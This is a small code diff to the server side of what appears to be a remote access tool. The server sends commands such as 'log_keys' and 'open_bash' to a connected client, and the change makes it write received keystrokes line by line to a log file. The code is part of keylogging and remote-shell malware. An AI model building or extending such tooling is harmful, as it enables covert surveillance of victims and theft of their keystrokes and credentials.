@@ -70,13 +70,12 @@ class Server():
                         raise NotAValidURLException("URL Must Start With http:// or https://")
             # Log Keys
             elif choice==6:
-                # Feature : Ask User To Add New Line Or Not
                 self.c.send("log_keys".encode())
                 while True:
-                    dkey=self.c.recv(99999).decode()
+                    dkey=str(self.c.recv(99999).decode())
                     print(dkey)
                     with open("key_log.log","a") as f:
-                        f.write(dkey)
+                        f.write(dkey+"\n")
             # Open Bash
             elif choice==7:
                 self.c.send("open_bash".encode())
